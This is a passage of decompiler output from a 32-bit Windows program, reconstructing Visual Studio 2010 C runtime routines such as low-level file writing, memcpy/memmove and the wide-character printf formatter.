            uVar16 = 2;
            pWVar10 = (WCHAR *)&local_10;
            local_f = cVar1;
LAB_0040ec26:
            iVar7 = _mbtowc((wchar_t *)&local_1ac0,(char *)pWVar10,(uint)uVar16);
            if (iVar7 == -1) break;
          }
          pWVar13 = (WCHAR *)((int)pWVar13 + 1);
          local_1ac4 = local_1ac4 + 1;
          nNumberOfBytesToWrite =
               WideCharToMultiByte((UINT)local_1ae4,0,(LPCWSTR)&local_1ac0,1,&local_10,5,(LPCSTR)0x0
                                   ,(LPBOOL)0x0);
          if (nNumberOfBytesToWrite == 0) break;
          BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),&local_10,nNumberOfBytesToWrite,
                            (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar9 == 0) goto LAB_0040f0a0;
          local_1acc = local_1ac4 + local_1ad4;
          if ((int)local_1ad8 < (int)nNumberOfBytesToWrite) break;
          if (local_1ae8 != 0) {
            local_10 = 0xd;
            BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),&local_10,1,(LPDWORD)&local_1ad8,
                              (LPOVERLAPPED)0x0);
            if (BVar9 == 0) goto LAB_0040f0a0;
            if ((int)local_1ad8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = local_1acc + 1;
          }
        }
        else {
          if ((local_1ac5 == '\x01') || (local_1ac5 == '\x02')) {
            local_1ac0 = (DWORD)(ushort)*pWVar13;
            local_1ae8 = (uint)(local_1ac0 == 10);
            pWVar13 = pWVar13 + 1;
            local_1ac4 = local_1ac4 + 2;
          }
          if ((local_1ac5 == '\x01') || (local_1ac5 == '\x02')) {
            wVar4 = __putwch_nolock((wchar_t)local_1ac0);
            if (wVar4 != (wint_t)local_1ac0) goto LAB_0040f0a0;
            local_1acc = local_1acc + 2;
            if (local_1ae8 != 0) {
              local_1ac0 = 0xd;
              wVar4 = __putwch_nolock(L'\r');
              if (wVar4 != (wint_t)local_1ac0) goto LAB_0040f0a0;
              local_1acc = local_1acc + 1;
              local_1ad4 = local_1ad4 + 1;
            }
          }
        }
      } while (local_1ac4 < _MaxCharCount);
      goto LAB_0040f0ac;
    }
LAB_0040f0b5:
    if (local_1ac0 != 0) {
      if (local_1ac0 == 5) {
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        __dosmaperr(local_1ac0);
      }
      goto LAB_0040f12e;
    }
  }
LAB_0040f0eb:
  if (((*(byte *)(iVar11 + 4 + *local_1ae0) & 0x40) == 0) || (*(char *)local_1ad0 != '\x1a')) {
    piVar6 = __errno();
    *piVar6 = 0x1c;
    puVar5 = ___doserrno();
    *puVar5 = 0;
  }
LAB_0040f12e:
  iVar11 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar11;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2010 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00423834)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_0040f208();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_0040c664();
  }
  return -1;
}



void FUN_0040f208(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  _memcpy
//  _memmove
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0040f3ef_caseD_2;
        case 3:
          goto switchD_0040f3ef_caseD_3;
        }
        goto switchD_0040f3ef_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0040f3ef_caseD_0;
      case 1:
        goto switchD_0040f3ef_caseD_1;
      case 2:
        goto switchD_0040f3ef_caseD_2;
      case 3:
        goto switchD_0040f3ef_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040f3ef_caseD_2;
            case 3:
              goto switchD_0040f3ef_caseD_3;
            }
            goto switchD_0040f3ef_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040f3ef_caseD_2;
            case 3:
              goto switchD_0040f3ef_caseD_3;
            }
            goto switchD_0040f3ef_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040f3ef_caseD_2;
            case 3:
              goto switchD_0040f3ef_caseD_3;
            }
            goto switchD_0040f3ef_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0040f3ef_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_0040f3ef_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_0040f3ef_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_0040f3ef_caseD_0:
    return _Dst;
  }
  if (((0x7f < _Size) && (DAT_00423830 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy(_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0040f269_caseD_2;
      case 3:
        goto switchD_0040f269_caseD_3;
      }
      goto switchD_0040f269_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0040f269_caseD_0;
    case 1:
      goto switchD_0040f269_caseD_1;
    case 2:
      goto switchD_0040f269_caseD_2;
    case 3:
      goto switchD_0040f269_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040f269_caseD_2;
          case 3:
            goto switchD_0040f269_caseD_3;
          }
          goto switchD_0040f269_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040f269_caseD_2;
          case 3:
            goto switchD_0040f269_caseD_3;
          }
          goto switchD_0040f269_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040f269_caseD_2;
          case 3:
            goto switchD_0040f269_caseD_3;
          }
          goto switchD_0040f269_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0040f269_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0040f269_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0040f269_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0040f269_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2010 Release

void __cdecl _write_char(wchar_t param_1)

{
  wint_t wVar1;
  FILE *in_EAX;
  int *unaff_ESI;
  
  if (((*(byte *)&in_EAX->_flag & 0x40) == 0) || (in_EAX->_base != (char *)0x0)) {
    wVar1 = __fputwc_nolock(param_1,in_EAX);
    if (wVar1 == 0xffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2010 Release

void __thiscall _write_string(void *this,wchar_t *param_1)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  int unaff_EDI;
  
  piVar2 = __errno();
  iVar1 = *piVar2;
  if (((*(byte *)(unaff_EDI + 0xc) & 0x40) == 0) || (*(int *)(unaff_EDI + 8) != 0)) {
    piVar2 = __errno();
    *piVar2 = 0;
    while (0 < (int)this) {
      this = (void *)((int)this + -1);
      _write_char(*param_1);
      param_1 = param_1 + 1;
      if (*in_EAX == -1) {
        piVar2 = __errno();
        if (*piVar2 != 0x2a) break;
        _write_char(L'?');
      }
    }
    piVar2 = __errno();
    if (*piVar2 == 0) {
      piVar2 = __errno();
      *piVar2 = iVar1;
    }
  }
  else {
    *in_EAX = *in_EAX + (int)this;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __woutput_s_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __woutput_s_l(FILE *_File,wchar_t *_Format,_locale_t _Locale,va_list _ArgList)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  int iVar6;
  int extraout_ECX;
  byte *pbVar7;
  wchar_t *pwVar8;
  int *piVar9;
  byte *pbVar10;
  int **ppiVar11;
  bool bVar12;
  longlong lVar13;
  undefined8 uVar14;
  undefined4 uVar15;
  localeinfo_struct *plVar16;
  int *local_478;
  int *local_474;
  byte *local_46c;
  uint local_468;
  undefined4 local_464;
  wchar_t *local_460;
  int *local_45c;
  int local_458;
  int local_454;
  localeinfo_struct local_450;
  int local_448;
  char local_444;
  uint local_440;
  wchar_t local_43c;
  short local_43a;
  char local_438;
  undefined local_437;
  int *local_434;
  FILE *local_430;
  int local_42c;
  void *local_428;
  uint local_424;
  int local_420;
  int **local_41c;
  byte *local_418;
  int *local_414;
  int *local_410;
  uint local_40c;
  int local_408 [127];
  undefined4 local_209;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_430 = _File;
  local_41c = (int **)_ArgList;
  local_458 = 0;
  local_40c = 0;
  local_434 = (int *)0x0;
  local_410 = (int *)0x0;
  local_428 = (void *)0x0;
  local_454 = 0;
  local_42c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_450,_Locale);
  if ((_File == (FILE *)0x0) || (_Format == (wchar_t *)0x0)) {
switchD_0040f73c_caseD_9:
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_0040c664();
    if (local_444 != '\0') {
      *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
    }
  }
  else {
    local_424 = (uint)(ushort)*_Format;
    local_420 = 0;
    local_418 = (byte *)0x0;
    local_440 = 0;
    local_45c = (int *)0x0;
    if (*_Format != L'\0') {
      do {
        pwVar8 = _Format + 1;
        uVar4 = 0;
        local_460 = pwVar8;
        if (local_420 < 0) break;
        wVar2 = (wchar_t)local_424;
        if ((ushort)(wVar2 + L'￠') < 0x59) {
          uVar4 = (byte)(&DAT_0041b190)[local_424] & 0xf;
        }
        local_440 = (uint)((byte)(&DAT_0041b1b0)[local_440 + uVar4 * 9] >> 4);
        ppiVar11 = local_41c;
        switch(local_440) {
        case 0:
switchD_0040f73c_caseD_0:
          local_42c = 1;
          _write_char(wVar2);
          ppiVar11 = (int **)_ArgList;
          break;
        case 1:
          local_410 = (int *)0xffffffff;
          local_464 = 0;
          local_454 = 0;
          local_434 = (int *)0x0;
          local_428 = (void *)0x0;
          local_40c = 0;
          local_42c = 0;
          ppiVar11 = (int **)_ArgList;
          break;
        case 2:
          if (local_424 == 0x20) {
            local_40c = local_40c | 2;
            ppiVar11 = (int **)_ArgList;
          }
          else if (local_424 == 0x23) {
            local_40c = local_40c | 0x80;
            ppiVar11 = (int **)_ArgList;
          }
          else if (local_424 == 0x2b) {
            local_40c = local_40c | 1;
            ppiVar11 = (int **)_ArgList;
          }
          else if (local_424 == 0x2d) {
            local_40c = local_40c | 4;
            ppiVar11 = (int **)_ArgList;
          }
          else if (local_424 == 0x30) {
            local_40c = local_40c | 8;
            ppiVar11 = (int **)_ArgList;
          }
          break;
        case 3:
          if (wVar2 == L'*') {
            local_434 = *(int **)_ArgList;
            local_41c = (int **)((int)_ArgList + 4);
            ppiVar11 = local_41c;
            if ((int)local_434 < 0) {
              local_40c = local_40c | 4;
              local_434 = (int *)-(int)local_434;
            }
          }
          else {
            local_434 = (int *)((int)local_434 * 10 + -0x30 + local_424);
            ppiVar11 = (int **)_ArgList;
          }
          break;
        case 4:
          local_410 = (int *)0x0;
          ppiVar11 = (int **)_ArgList;
          break;
        case 5:
          if (wVar2 == L'*') {
            local_410 = *(int **)_ArgList;
            local_41c = (int **)((int)_ArgList + 4);
            ppiVar11 = local_41c;
            if ((int)local_410 < 0) {
              local_410 = (int *)0xffffffff;
            }
          }
          else {
            local_410 = (int *)((int)local_410 * 10 + -0x30 + local_424);
            ppiVar11 = (int **)_ArgList;
          }
          break;
        case 6:
          if (local_424 == 0x49) {
            wVar1 = *pwVar8;
            if ((wVar1 == L'6') && (_Format[2] == L'4')) {
              local_40c = local_40c | 0x8000;
              pwVar8 = _Format + 3;
              ppiVar11 = (int **)_ArgList;
            }
            else if ((wVar1 == L'3') && (_Format[2] == L'2')) {
              local_40c = local_40c & 0xffff7fff;
              pwVar8 = _Format + 3;
              ppiVar11 = (int **)_ArgList;
            }
            else {
              ppiVar11 = (int **)_ArgList;
              if (((((wVar1 != L'd') && (wVar1 != L'i')) && (wVar1 != L'o')) &&
                  ((wVar1 != L'u' && (wVar1 != L'x')))) && (wVar1 != L'X')) {
                local_440 = 0;
                goto switchD_0040f73c_caseD_0;
              }
            }
          }
          else if (local_424 == 0x68) {
            local_40c = local_40c | 0x20;
            ppiVar11 = (int **)_ArgList;
          }
          else if (local_424 == 0x6c) {
            if (*pwVar8 == L'l') {
              local_40c = local_40c | 0x1000;
              pwVar8 = _Format + 2;
              ppiVar11 = (int **)_ArgList;
            }
            else {
              local_40c = local_40c | 0x10;
              ppiVar11 = (int **)_ArgList;
            }
          }
          else {
            ppiVar11 = (int **)_ArgList;
            if (local_424 == 0x77) {
              local_40c = local_40c | 0x800;
            }
          }
          break;
        case 7:
          if (local_424 < 0x65) {
            if (local_424 == 100) {
LAB_0040fc38:
              local_40c = local_40c | 0x40;
LAB_0040fc3f:
              local_424 = 10;
LAB_0040fc49:
              if (((local_40c & 0x8000) == 0) && ((local_40c & 0x1000) == 0)) {
                local_41c = (int **)((int)_ArgList + 4);
                if ((local_40c & 0x20) == 0) {
                  piVar3 = *(int **)_ArgList;
                  if ((local_40c & 0x40) == 0) {
                    piVar9 = (int *)0x0;
                  }
                  else {
                    piVar9 = (int *)((int)piVar3 >> 0x1f);
                  }
                }
                else {
                  if ((local_40c & 0x40) == 0) {
                    piVar3 = (int *)(uint)*(ushort *)_ArgList;
                  }
                  else {
                    piVar3 = (int *)(int)*(short *)_ArgList;
                  }
                  piVar9 = (int *)((int)piVar3 >> 0x1f);
                }
              }
              else {
                local_41c = (int **)((int)_ArgList + 8);
                piVar3 = *(int **)_ArgList;
                piVar9 = *(int **)((int)_ArgList + 4);
              }
              if ((((local_40c & 0x40) != 0) && ((int)piVar9 < 1)) && ((int)piVar9 < 0)) {
                bVar12 = piVar3 != (int *)0x0;
                piVar3 = (int *)-(int)piVar3;
                piVar9 = (int *)-(int)((int)piVar9 + (uint)bVar12);
                local_40c = local_40c | 0x100;
              }
              if ((local_40c & 0x9000) == 0) {
                piVar9 = (int *)0x0;
              }
              lVar13 = CONCAT44(piVar9,piVar3);
              if ((int)local_410 < 0) {
                local_410 = (int *)0x1;
              }
              else {
                local_40c = local_40c & 0xfffffff7;
                if (0x200 < (int)local_410) {
                  local_410 = (int *)0x200;
                }
              }
              if (((uint)piVar3 | (uint)piVar9) == 0) {
                local_428 = (void *)0x0;
              }
              piVar3 = &local_209;
              while( true ) {
                pbVar10 = (byte *)((ulonglong)lVar13 >> 0x20);
                piVar9 = (int *)((int)local_410 + -1);
                if (((int)local_410 < 1) && (lVar13 == 0)) break;
                local_410 = piVar9;
                lVar13 = __aulldvrm((uint)lVar13,(uint)pbVar10,local_424,(int)local_424 >> 0x1f);
                iVar6 = extraout_ECX + 0x30;
                if (0x39 < iVar6) {
                  iVar6 = iVar6 + local_458;
                }
                *(byte *)piVar3 = (byte)iVar6;
                piVar3 = (int *)((int)piVar3 + -1);
                local_46c = pbVar10;
              }
              local_418 = (byte *)((int)&local_209 + -(int)piVar3);
              local_414 = (int *)((int)piVar3 + 1);
              local_410 = piVar9;
              if (((local_40c & 0x200) != 0) &&
                 ((local_418 == (byte *)0x0 || (*(byte *)local_414 != 0x30)))) {
                *(byte *)piVar3 = 0x30;
                local_418 = (byte *)((int)&local_209 + -(int)piVar3 + 1);
                local_414 = piVar3;
              }
            }
            else if (local_424 < 0x54) {
              if (local_424 == 0x53) {
                if ((local_40c & 0x830) == 0) {
                  local_40c = local_40c | 0x20;
                }
                goto LAB_0040fa13;
              }
              if (local_424 != 0x41) {
                if (local_424 == 0x43) {
                  if ((local_40c & 0x830) == 0) {
                    local_40c = local_40c | 0x20;
                  }
LAB_0040fac1:
                  wVar2 = *(wchar_t *)_ArgList;
                  local_468 = (uint)(ushort)wVar2;
                  local_41c = (int **)((int)_ArgList + 4);
                  local_42c = 1;
                  if ((local_40c & 0x20) == 0) {
                    local_408[0]._0_2_ = wVar2;
                  }
                  else {
                    local_438 = (char)wVar2;
                    local_437 = 0;
                    iVar6 = __mbtowc_l((wchar_t *)local_408,&local_438,
                                       (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                    if (iVar6 < 0) {
                      local_454 = 1;
                    }
                  }
                  local_418 = (byte *)0x1;
                  local_414 = local_408;
                  goto LAB_0040ff7a;
                }
                if ((local_424 != 0x45) && (local_424 != 0x47)) goto LAB_0040ff7a;
              }
              local_424 = local_424 + 0x20;
              local_464 = 1;
LAB_0040f9aa:
              local_40c = local_40c | 0x40;
              local_418 = (byte *)0x200;
              piVar3 = local_408;
              pbVar10 = local_418;
              piVar9 = local_408;
              if ((int)local_410 < 0) {
                local_410 = (int *)0x6;
              }
              else if (local_410 == (int *)0x0) {
                if ((short)local_424 == 0x67) {
                  local_410 = (int *)0x1;
                }
              }
              else {
                if (0x200 < (int)local_410) {
                  local_410 = (int *)0x200;
                }
                if (0xa3 < (int)local_410) {
                  pbVar10 = (byte *)((int)local_410 + 0x15d);
                  local_414 = local_408;
                  local_45c = (int *)__malloc_crt((size_t)pbVar10);
                  piVar3 = local_45c;
                  piVar9 = local_45c;
                  if (local_45c == (int *)0x0) {
                    local_410 = (int *)0xa3;
                    piVar3 = local_408;
                    pbVar10 = local_418;
                    piVar9 = local_414;
                  }
                }
              }
              local_414 = piVar9;
              local_418 = pbVar10;
              local_478 = *local_41c;
              local_474 = local_41c[1];
              plVar16 = &local_450;
              uVar14 = CONCAT44(local_410,(int)(char)local_424);
              ppiVar11 = &local_478;
              piVar9 = piVar3;
              pbVar10 = local_418;
              uVar15 = local_464;
              local_41c = local_41c + 2;
              pcVar5 = (code *)DecodePointer(PTR_LAB_00420e68);
              (*pcVar5)(ppiVar11,piVar9,pbVar10,uVar14,uVar15,plVar16);
              uVar4 = local_40c & 0x80;
              if ((uVar4 != 0) && (local_410 == (int *)0x0)) {
                plVar16 = &local_450;
                piVar9 = piVar3;
                pcVar5 = (code *)DecodePointer(PTR_LAB_00420e74);
                (*pcVar5)(piVar9,plVar16);
              }
              if (((short)local_424 == 0x67) && (uVar4 == 0)) {
                plVar16 = &local_450;
                piVar9 = piVar3;
                pcVar5 = (code *)DecodePointer(PTR_LAB_00420e70);
                (*pcVar5)(piVar9,plVar16);
              }
              if (*(byte *)piVar3 == 0x2d) {
                local_40c = local_40c | 0x100;
                piVar3 = (int *)((int)piVar3 + 1);
                local_414 = piVar3;
              }
LAB_0040fb9a:
              local_418 = (byte *)_strlen((char *)piVar3);
            }
            else {
              if (local_424 == 0x58) goto LAB_0040fd9f;
              if (local_424 == 0x5a) {
                piVar3 = *(int **)_ArgList;
                local_41c = (int **)((int)_ArgList + 4);
                if ((piVar3 == (int *)0x0) ||
                   (local_414 = (int *)piVar3[1], local_414 == (int *)0x0)) {
                  local_414 = (int *)PTR_DAT_00420d24;
                  piVar3 = (int *)PTR_DAT_00420d24;
                  goto LAB_0040fb9a;
                }
                local_418 = (byte *)(int)(short)*(ushort *)piVar3;
                if ((local_40c & 0x800) != 0) {
                  iVar6 = (int)local_418 - ((int)local_418 >> 0x1f);
                  goto LAB_0040ff72;
                }
                local_42c = 0;
              }
              else {
                if (local_424 == 0x61) goto LAB_0040f9aa;
                if (local_424 == 99) goto LAB_0040fac1;
              }
            }
LAB_0040ff7a:
            if (local_454 == 0) {
              if ((local_40c & 0x40) != 0) {
                if ((local_40c & 0x100) == 0) {
                  if ((local_40c & 1) == 0) {
                    if ((local_40c & 2) == 0) goto LAB_0040ffbc;
                    local_43c = L' ';
                  }
                  else {
                    local_43c = L'+';
                  }
                }
                else {
                  local_43c = L'-';
                }
                local_428 = (void *)0x1;
              }
LAB_0040ffbc:
              pbVar7 = (byte *)((int)local_434 + (-(int)local_428 - (int)local_418));
              local_46c = pbVar7;
              pbVar10 = pbVar7;
              if ((local_40c & 0xc) == 0) {
                do {
                  if ((int)pbVar10 < 1) break;
                  pbVar10 = pbVar10 + -1;
                  _write_char(L' ');
                } while (local_420 != -1);
              }
              _write_string(local_428,&local_43c);
              if (((local_40c & 8) != 0) && ((local_40c & 4) == 0)) {
                do {
                  if ((int)pbVar7 < 1) break;
                  pbVar7 = pbVar7 + -1;
                  _write_char(L'0');
                } while (local_420 != -1);
              }
              if ((local_42c == 0) && (pbVar10 = local_418, piVar3 = local_414, 0 < (int)local_418))
              {
                do {
                  pbVar10 = pbVar10 + -1;
                  local_424 = __mbtowc_l((wchar_t *)&local_468,(char *)piVar3,
                                         (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                  if ((int)local_424 < 1) {
                    local_420 = -1;
                    break;
                  }
                  _write_char((wchar_t)local_468);
                  piVar3 = (int *)((int)piVar3 + local_424);
                } while (0 < (int)pbVar10);
              }
              else {
                _write_string(local_418,(wchar_t *)local_414);
              }
